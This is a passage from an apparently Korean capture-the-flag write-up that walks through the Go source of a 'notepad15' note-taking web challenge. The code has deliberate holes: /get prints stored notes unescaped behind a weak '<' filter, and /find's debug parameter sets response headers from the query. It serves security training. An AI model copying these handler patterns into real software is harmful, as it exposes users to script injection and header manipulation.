</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">present</span> {
</span></span><span style="display:flex;"><span>			delete(<span style="color:#a6e22e">param</span>, <span style="color:#e6db74">&#34;debug&#34;</span>)
</span></span><span style="display:flex;"><span>			delete(<span style="color:#a6e22e">param</span>, <span style="color:#e6db74">&#34;startsWith&#34;</span>)
</span></span><span style="display:flex;"><span>			delete(<span style="color:#a6e22e">param</span>, <span style="color:#e6db74">&#34;endsWith&#34;</span>)
</span></span><span style="display:flex;"><span>			delete(<span style="color:#a6e22e">param</span>, <span style="color:#e6db74">&#34;condition&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">v</span>, <span style="color:#a6e22e">d</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">param</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">k</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">d</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">regexp</span>.<span style="color:#a6e22e">MustCompile</span>(<span style="color:#e6db74">&#34;^[a-zA-Z0-9{}_;-]*$&#34;</span>).<span style="color:#a6e22e">MatchString</span>(<span style="color:#a6e22e">k</span>) <span style="color:#f92672">&amp;&amp;</span> len(<span style="color:#a6e22e">d</span>) &lt; <span style="color:#ae81ff">5</span> {
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Header</span>().<span style="color:#a6e22e">Set</span>(<span style="color:#a6e22e">v</span>, <span style="color:#a6e22e">k</span>)
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">responseee</span> = <span style="color:#e6db74">&#34;404 No Note Found&#34;</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">headerSetter</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">cType</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">responseee</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Reset notes every 30 mins.  No Vuln in this
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">resetNotes</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Notes</span>[<span style="color:#a6e22e">adminID</span>] = <span style="color:#a6e22e">adminNOTE</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Tick</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Notes</span> = make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Notes</span>[<span style="color:#a6e22e">adminID</span>] = <span style="color:#a6e22e">adminNOTE</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Seed</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">UnixNano</span>())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dir</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flag</span>.<span style="color:#a6e22e">StringVar</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">dir</span>, <span style="color:#e6db74">&#34;dir&#34;</span>, <span style="color:#e6db74">&#34;./public&#34;</span>, <span style="color:#e6db74">&#34;the directory to serve files from. Defaults to the current dir&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flag</span>.<span style="color:#a6e22e">Parse</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">resetNotes</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">r</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">mux</span>.<span style="color:#a6e22e">NewRouter</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Host</span>(<span style="color:#e6db74">&#34;chall.notepad15.gq:1515&#34;</span>).<span style="color:#a6e22e">Subrouter</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/add&#34;</span>, <span style="color:#a6e22e">add</span>).<span style="color:#a6e22e">Methods</span>(<span style="color:#e6db74">&#34;POST&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/get&#34;</span>, <span style="color:#a6e22e">get</span>).<span style="color:#a6e22e">Methods</span>(<span style="color:#e6db74">&#34;GET&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/find&#34;</span>, <span style="color:#a6e22e">find</span>).<span style="color:#a6e22e">Methods</span>(<span style="color:#e6db74">&#34;GET&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">PathPrefix</span>(<span style="color:#e6db74">&#34;/&#34;</span>).<span style="color:#a6e22e">Handler</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StripPrefix</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">FileServer</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Dir</span>(<span style="color:#a6e22e">dir</span>))))
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Server started at http://0.0.0.0:3000&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">loggedRouter</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">LoggingHandler</span>(<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdout</span>, <span style="color:#a6e22e">r</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">srv</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Server</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Addr</span>: <span style="color:#e6db74">&#34;0.0.0.0:3000&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Good practice to set timeouts to avoid Slowloris attacks.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">WriteTimeout</span>: <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">15</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ReadTimeout</span>:  <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">15</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">IdleTimeout</span>:  <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Handler</span>:      <span style="color:#a6e22e">loggedRouter</span>, <span style="color:#75715e">// Pass our instance of gorilla/mux in.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">srv</span>.<span style="color:#a6e22e">ListenAndServe</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>해당 문제의 서버는 <code>Go</code>라는 프로그래밍 언어로 작성이 되어 있습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Seed</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">UnixNano</span>())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dir</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flag</span>.<span style="color:#a6e22e">StringVar</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">dir</span>, <span style="color:#e6db74">&#34;dir&#34;</span>, <span style="color:#e6db74">&#34;./public&#34;</span>, <span style="color:#e6db74">&#34;the directory to serve files from. Defaults to the current dir&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flag</span>.<span style="color:#a6e22e">Parse</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">resetNotes</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">r</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">mux</span>.<span style="color:#a6e22e">NewRouter</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Host</span>(<span style="color:#e6db74">&#34;chall.notepad15.gq:1515&#34;</span>).<span style="color:#a6e22e">Subrouter</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/add&#34;</span>, <span style="color:#a6e22e">add</span>).<span style="color:#a6e22e">Methods</span>(<span style="color:#e6db74">&#34;POST&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/get&#34;</span>, <span style="color:#a6e22e">get</span>).<span style="color:#a6e22e">Methods</span>(<span style="color:#e6db74">&#34;GET&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/find&#34;</span>, <span style="color:#a6e22e">find</span>).<span style="color:#a6e22e">Methods</span>(<span style="color:#e6db74">&#34;GET&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">PathPrefix</span>(<span style="color:#e6db74">&#34;/&#34;</span>).<span style="color:#a6e22e">Handler</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StripPrefix</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">FileServer</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Dir</span>(<span style="color:#a6e22e">dir</span>))))
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Server started at http://0.0.0.0:3000&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">loggedRouter</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">handlers</span>.<span style="color:#a6e22e">LoggingHandler</span>(<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Stdout</span>, <span style="color:#a6e22e">r</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">srv</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Server</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Addr</span>: <span style="color:#e6db74">&#34;0.0.0.0:3000&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Good practice to set timeouts to avoid Slowloris attacks.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">WriteTimeout</span>: <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">15</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ReadTimeout</span>:  <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">15</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">IdleTimeout</span>:  <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Handler</span>:      <span style="color:#a6e22e">loggedRouter</span>, <span style="color:#75715e">// Pass our instance of gorilla/mux in.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">srv</span>.<span style="color:#a6e22e">ListenAndServe</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>main()</code> 함수는 go 파일이 실행될 때, 실행이 되는 곳 입니다. C언어에 main() 함수와 동일 합니다. 일단 코드를 보면 <code>/add</code>, <code>/get</code>, <code>/find</code>, <code>/</code> 경로로 라우팅을 시켜주는 것을 볼 수 있습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">id</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">getIDFromCooke</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">w</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">adminID</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">ParseForm</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">noteConte</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Form</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#e6db74">&#34;content&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">noteConte</span>) &lt; <span style="color:#ae81ff">75</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Notes</span>[<span style="color:#a6e22e">id</span>] = <span style="color:#a6e22e">noteConte</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">w</span>, <span style="color:#e6db74">&#34;OK&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>/add</code> 기능은 메모 작성을 저장하는 기능인데 코드를 보면 <code>getIDFromCooke()</code> 함수를 이용해서 쿠키에서 <code>id</code>를 가져 온 후에 <code>id</code>가 관리자 아이디와 동일하지 않으면 입력한 값을 <code>Notes[id]</code>에 넣어주는 것을 볼 수 있습니다. 여기서 <code>getIDFromCooke()</code> 함수는 그냥 현재 요청 한 사용자의 쿠키에서 <code>id</code> 값을 가져와서 <code>id</code>가 없으면 생성하고, 있으면 그냥 그 값을 반환해주는 함수입니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">id</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">getIDFromCooke</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">w</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Notes</span>[<span style="color:#a6e22e">id</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">headerSetter</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">cType</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">w</span>, <span style="color:#e6db74">&#34;404 No Note Found&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">regexp</span>.<span style="color:#a6e22e">MustCompile</span>(<span style="color:#e6db74">&#34;&lt;[a-zA-Z0-9]&#34;</span>).<span style="color:#a6e22e">MatchString</span>(<span style="color:#a6e22e">x</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">EscapeString</span>(<span style="color:#a6e22e">x</span>))
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">x</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>/get</code> 기능은 <code>/add</code> 기능으로 작성한 메모를 보여주는 기능 입니다. <code>getIDFromCooke()</code> 함수로 <code>id</code>를 가져와서 <code>id</code> 값을 가진 메모를 가져온 후에 <code>Fprintf()</code> 함수로 출력하는 것을 볼 수 있습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">id</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">getIDFromCooke</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">w</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">param</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">Query</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Notes</span>[<span style="color:#a6e22e">id</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">which</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">str</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">param</span>[<span style="color:#e6db74">&#34;condition&#34;</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">err</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">which</span> = <span style="color:#e6db74">&#34;any&#34;</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">which</span> = <span style="color:#a6e22e">str</span>[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">start</span> <span style="color:#66d9ef">bool</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">str</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">param</span>[<span style="color:#e6db74">&#34;startsWith&#34;</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">err</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">start</span> = <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">HasPrefix</span>(<span style="color:#a6e22e">x</span>, <span style="color:#e6db74">&#34;arthur&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">start</span> = <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">HasPrefix</span>(<span style="color:#a6e22e">x</span>, <span style="color:#a6e22e">str</span>[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">responseee</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">end</span> <span style="color:#66d9ef">bool</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">str</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">param</span>[<span style="color:#e6db74">&#34;endsWith&#34;</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">err</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">end</span> = <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">HasSuffix</span>(<span style="color:#a6e22e">x</span>, <span style="color:#e6db74">&#34;morgan&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">end</span> = <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">HasSuffix</span>(<span style="color:#a6e22e">x</span>, <span style="color:#a6e22e">str</span>[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">which</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;starts&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">start</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">responseee</span> = <span style="color:#a6e22e">x</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">which</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ends&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">end</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">responseee</span> = <span style="color:#a6e22e">x</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">which</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;both&#34;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">start</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">end</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">responseee</span> = <span style="color:#a6e22e">x</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">which</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;any&#34;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">start</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">end</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">responseee</span> = <span style="color:#a6e22e">x</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">present</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">param</span>[<span style="color:#e6db74">&#34;debug&#34;</span>]
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">present</span> {
</span></span><span style="display:flex;"><span>			delete(<span style="color:#a6e22e">param</span>, <span style="color:#e6db74">&#34;debug&#34;</span>)
</span></span><span style="display:flex;"><span>			delete(<span style="color:#a6e22e">param</span>, <span style="color:#e6db74">&#34;startsWith&#34;</span>)
</span></span><span style="display:flex;"><span>			delete(<span style="color:#a6e22e">param</span>, <span style="color:#e6db74">&#34;endsWith&#34;</span>)
</span></span><span style="display:flex;"><span>			delete(<span style="color:#a6e22e">param</span>, <span style="color:#e6db74">&#34;condition&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">v</span>, <span style="color:#a6e22e">d</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">param</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">k</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">d</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">regexp</span>.<span style="color:#a6e22e">MustCompile</span>(<span style="color:#e6db74">&#34;^[a-zA-Z0-9{}_;-]*$&#34;</span>).<span style="color:#a6e22e">MatchString</span>(<span style="color:#a6e22e">k</span>) <span style="color:#f92672">&amp;&amp;</span> len(<span style="color:#a6e22e">d</span>) &lt; <span style="color:#ae81ff">5</span> {
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Header</span>().<span style="color:#a6e22e">Set</span>(<span style="color:#a6e22e">v</span>, <span style="color:#a6e22e">k</span>)
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">responseee</span> = <span style="color:#e6db74">&#34;404 No Note Found&#34;</span>
